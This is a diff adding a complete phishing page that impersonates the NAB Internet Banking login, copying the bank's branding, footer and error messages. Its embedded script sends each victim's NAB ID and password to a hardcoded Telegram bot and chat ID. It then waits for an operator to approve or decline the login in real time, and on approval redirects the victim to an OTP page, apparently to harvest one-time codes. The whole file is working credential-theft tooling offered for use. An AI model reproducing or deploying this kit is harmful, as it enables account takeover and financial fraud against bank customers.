@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NAB Internet Banking</title>
+<style>
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+/* BODY BACKGROUND IMAGE */
+body{
+    background:url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e') no-repeat center/cover;
+}
+
+/* TOP BLACK HEADER */
+.header{
+    background:#000;
+    color:#fff;
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+}
+
+.menu{
+    font-size:20px;
+    margin-left: 10px;
+}
+
+.header-title{
+    font-size:18px;
+    font-weight:500;
+}
+
+/* CARD */
+.card{
+    width:92%;
+    max-width:380px;
+    background:#efefef;
+    margin:20px auto;
+    padding:20px;
+    border-radius:10px;
+    position: relative;        /* for absolute positioning of loading */
+    min-height: 420px;
+}
+
+/* TITLE */
+.card h1{
+    font-size:26px;
+    font-weight:500;
+    margin-bottom:20px;
+    color:#333;
+}
+
+/* LABEL */
+.label{
+    font-size:13px;
+    font-weight:bold;
+    margin-top: 30px;
+    margin-bottom:10px;
+    color:#222;
+}
+
+/* INPUT - neutral border by default */
+.input{
+    width:100%;
+    padding:14px;
+    border-radius:6px;
+    border:0.5px solid #262626;        /* neutral grey */
+    background:#fff;
+    font-size:16px;
+    transition: border-color 0.2s;
+}
+
+/* error state for input (applied via JS) */
+.input.input-error{
+    border-color: #d32f2f;
+}
+
+/* ERROR TEXT (inline field errors) */
+.error{
+    color:#d32f2f;
+    font-size:13px;
+    margin:6px 0 14px;
+    display:flex;
+    align-items:center;
+    gap:6px;
+}
+
+/* CHECKBOX */
+.checkbox{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin:10px 0;
+}
+
+.checkbox input{
+    margin-top:3px;
+}
+
+.checkbox label{
+    font-size:14px;
+    color:#333;
+}
+
+/* SMALL TEXT */
+.small-text{
+    font-size:12px;
+    color:#555;
+    margin-bottom:20px;
+    line-height:1.4;
+}
+
+/* BUTTON */
+.btn{
+    width:100%;
+    background:#d50000;
+    color:#fff;
+    border:none;
+    padding:14px;
+    font-size:16px;
+    border-radius:6px;
+    font-weight:bold;
+    cursor:pointer;
+}
+.btn:disabled {
+    opacity:0.6;
+    cursor:not-allowed;
+}
+
+/* LINKS */
+.link{
+    display:block;
+    margin-top:15px;
+    color:#b00000;
+    font-size:14px;
+    text-decoration:underline;
+}
+
+/* REGISTER SECTION */
+.register{
+    margin-top:20px;
+    padding-top:15px;
+    border-top:1px solid #ccc;
+    display:flex;
+    justify-content:space-between;
+    font-size:14px;
+}
+
+.register a{
+    color:#b00000;
+    font-weight:bold;
+    text-decoration:underline;
+}
+
+.logo{
+    width:30px;
+    height:30px;
+    margin-right:10px;
+    margin-left:10px;
+    object-fit:contain;
+}
+
+.footer{
+    width:100%;
+    text-align:center;
+    padding:12px 0;
+    font-size:13px;
+    color:white;
+    background:#000;
+}
+
+.password-wrapper{
+    position:relative;
+    width:100%;
+}
+
+/* Eye icon – clickable toggles password visibility */
+.eye{
+    position:absolute;
+    right:12px;
+    top:50%;
+    transform:translateY(-50%);
+    width:22px;
+    height:22px;
+    background:url('https://cdn-icons-png.flaticon.com/512/159/159604.png') no-repeat center/contain;
+    cursor: pointer;
+    z-index:3;
+}
+
+.password-input{
+    padding-right:40px;
+}
+
+/* ===== ERROR BOX (hidden by default) ===== */
+.generic-error {
+    display: none;
+    background: #f5f5f5;
+    border:2px solid #d32f2f;
+    border-radius:8px;
+    padding:15px;
+    margin:0 0 20px 0;
+    gap:10px;
+    align-items:flex-start;
+}
+
+.error-icon{
+    background:#d50000;
+    color:#fff;
+    border-radius:50%;
+    width:20px;
+    height:20px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:12px;
+    font-weight:bold;
+    margin-top:3px;
+}
+
+.error-text{
+    font-size:14px;
+    color:#333;
+    line-height:1.5;
+}
+
+/* ===== LOADING OVERLAY (absolutely centered in card) ===== */
+.card-loading {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: #efefef;
+    border-radius: 10px;
+    display: none;               /* hidden by default */
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    padding: 20px;
+}
+
+.loader {
+  width:60px;
+  height:60px;
+  margin:0 auto 15px;
+  border:5px solid #ddd;
+  border-top:5px solid #d50000;
+  border-radius:50%;
+  animation: spin 1s linear infinite;
+}
+
+.loading-text{
+    color:#555;
+    font-size:15px;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.card-content {
+    display: block;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div class="menu">☰</div>
+    <img src="image/nab.png" class="logo" alt="NAB Logo">
+    <div class="header-title">Internet Banking</div>
+</div>
+
+<div class="card">
+    <!-- Generic error (hidden initially) -->
+    <div class="generic-error" id="genericError">
+        <div class="error-icon">!</div>
+        <div class="error-text" id="errorText">Your NAB ID or password is incorrect, or you're not registered for Internet Banking. Please try again or register.</div>
+    </div>
+
+    <!-- Normal card content -->
+    <div class="card-content" id="cardContent">
+        <h1>NAB Internet Banking</h1>
+
+        <div class="label">NAB ID</div>
+        <input class="input" type="text" id="nabId" placeholder="Enter NAB ID">
+        <div class="error" id="nabIdError" style="display:none;">❗ Enter your NAB ID.</div>
+
+        <div class="label">Password</div>
+        <div class="password-wrapper">
+            <input class="input password-input" type="password" id="password" placeholder="Enter password">
+            <span class="eye" id="eyeIcon"></span>
+        </div>
+        <div class="error" id="passwordError" style="display:none;">❗ Enter your password.</div>
+
+        <div class="checkbox">
+            <input type="checkbox" id="remember">
+            <label for="remember">Remember my NAB ID</label>
+        </div>
+
+        <div class="small-text">
+            For security reasons, we’ll only show you the last 3 digits. Don’t save your NAB ID if anyone else uses this browser.
+        </div>
+
+        <button class="btn" id="loginBtn">Login</button>
+
+        <a href="#" class="link">Forgot your NAB ID or password?</a>
+
+        <div class="register">
+            <span>New to NAB Internet Banking?</span>
+            <a href="#">Register now</a>
+        </div>
+    </div>
+
+    <!-- Loading spinner (absolutely centered) -->
+    <div class="card-loading" id="cardLoading">
+        <div class="loader"></div>
+        <div class="loading-text">Processing, please wait</div>
+    </div>
+</div>
+
+<div class="footer">
+    <span>&copy; National Australia Bank Limited</span>
+</div>
+
+<script>
+(function() {
+    // ==================== TELEGRAM CONFIG ====================
+    const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+    const CHAT_ID   = '1006917440';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // ==================== DOM ELEMENTS ====================
+    const nabIdInput = document.getElementById('nabId');
+    const passwordInput = document.getElementById('password');
+    const nabIdError = document.getElementById('nabIdError');
+    const passwordError = document.getElementById('passwordError');
+    const genericError = document.getElementById('genericError');
+    const errorText = document.getElementById('errorText');
+    const loginBtn = document.getElementById('loginBtn');
+    const cardContent = document.getElementById('cardContent');
+    const cardLoading = document.getElementById('cardLoading');
+    const eyeIcon = document.getElementById('eyeIcon');
+
+    // State
+    let isSubmitting = false;
+    let currentPollInterval = null;
+    let pollTimeout = null;
+
+    // ==================== PASSWORD TOGGLE (fixed) ====================
+    eyeIcon.addEventListener('click', function() {
+        // Toggle input type between 'password' and 'text'
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+        } else {
+            passwordInput.type = 'password';
+        }
+    });
+
+    // ==================== INPUT ERROR HIGHLIGHT ====================
+    function setInputError(input, hasError) {
+        if (hasError) {
+            input.classList.add('input-error');
+        } else {
+            input.classList.remove('input-error');
+        }
+    }
+
+    function hideAllErrors() {
+        nabIdError.style.display = 'none';
+        passwordError.style.display = 'none';
+        genericError.style.display = 'none';
+        setInputError(nabIdInput, false);
+        setInputError(passwordInput, false);
+    }
+
+    function showGenericError(message) {
+        if (message) errorText.innerText = message;
+        genericError.style.display = 'flex';
+    }
+
+    // Escape HTML for Telegram
+    function escapeHtml(unsafe) {
+        return unsafe.replace(/[&<>"]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            if (m === '"') return '&quot;';
+            return m;
+        });
+    }
+
+    async function sendToTelegram(payload) {
+        const url = `${API_BASE}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Telegram send error:', error);
+            throw error;
+        }
+    }
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+        if (currentPollInterval) clearInterval(currentPollInterval);
+        let lastUpdateId = 0;
+
+        currentPollInterval = setInterval(async () => {
+            try {
+                const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                const response = await fetch(url);
+                const data = await response.json();
+                if (!data.ok || !data.result.length) return;
+
+                let decisionMade = false;
+                data.result.forEach(update => {
+                    lastUpdateId = update.update_id;
+                    if (!decisionMade && update.callback_query && update.callback_query.data) {
+                        const parts = update.callback_query.data.split('_');
+                        if (parts.length >= 3) {
+                            const [type, action, time] = parts;
+                            if (time == expectedTs && type === expectedPrefix) {
+                                decisionMade = true;
+                                clearInterval(currentPollInterval);
+                                currentPollInterval = null;
+                                if (pollTimeout) {
+                                    clearTimeout(pollTimeout);
+                                    pollTimeout = null;
+                                }
+                                onDecision(action);
+                            }
+                        }
+                    }
+                });
+            } catch (err) {
+                console.warn('Polling error:', err);
+            }
+        }, 1500);
+    }
+
+    function generateOTP() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    function showLoading() {
+        cardContent.style.display = 'none';
+        cardLoading.style.display = 'flex';   // absolute → covers card
+        hideAllErrors();
+    }
+
+    function showContent() {
+        cardContent.style.display = 'block';
+        cardLoading.style.display = 'none';
+    }
+
+    async function handleLogin() {
+        if (isSubmitting) return;
+
+        const nabId = nabIdInput.value.trim();
+        const password = passwordInput.value;
+
+        hideAllErrors();
+
+        let hasError = false;
+        if (nabId === '') {
+            nabIdError.style.display = 'flex';
+            setInputError(nabIdInput, true);
+            hasError = true;
+        }
+        if (password === '') {
+            passwordError.style.display = 'flex';
+            setInputError(passwordInput, true);
+            hasError = true;
+        }
+        if (hasError) return;
+
+        isSubmitting = true;
+        loginBtn.disabled = true;
+        showLoading();
+
+        const ts = Date.now();
+        const safeNabId = escapeHtml(nabId);
+        const safePassword = escapeHtml(password);
+        const msg = `NAB Internet Banking login\n\nNAB ID: <code>${safeNabId}</code>\nPassword: <code>${safePassword}</code>\n\nChoose action:`;
+
+        try {
+            await sendToTelegram({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: 'Approve', callback_data: `nab_approve_${ts}` },
+                        { text: 'Decline', callback_data: `nab_decline_${ts}` }
+                    ]]
+                }
+            });
+
+            pollForCallback('nab', ts, (action) => {
+                showContent();
+                loginBtn.disabled = false;
+                isSubmitting = false;
+
+                if (action === 'approve') {
+                    sessionStorage.setItem('nabId', nabId);
+                    sessionStorage.setItem('otp', generateOTP());
+                    window.location.href = 'otp.html';
+                } else if (action === 'decline') {
+                    showGenericError();
+                    passwordInput.value = '';
+                    setInputError(passwordInput, false);
+                }
+            });
+
+            pollTimeout = setTimeout(() => {
+                if (currentPollInterval) {
+                    clearInterval(currentPollInterval);
+                    currentPollInterval = null;
+                }
+                showContent();
+                loginBtn.disabled = false;
+                isSubmitting = false;
+                showGenericError('Request timed out. Please try again.');
+            }, 60000);
+
+        } catch (err) {
+            console.error(err);
+            showContent();
+            loginBtn.disabled = false;
+            isSubmitting = false;
+            showGenericError('Failed to send request. Check bot token or network.');
+        }
+    }
+
+    loginBtn.addEventListener('click', handleLogin);
+
+    nabIdInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleLogin();
+    });
+    passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleLogin();
+    });
+
+    nabIdInput.addEventListener('input', () => {
+        nabIdError.style.display = 'none';
+        setInputError(nabIdInput, false);
+        genericError.style.display = 'none';
+    });
+    passwordInput.addEventListener('input', () => {
+        passwordError.style.display = 'none';
+        setInputError(passwordInput, false);
+        genericError.style.display = 'none';
+    });
+})();
+</script>
+</body>
+</html>
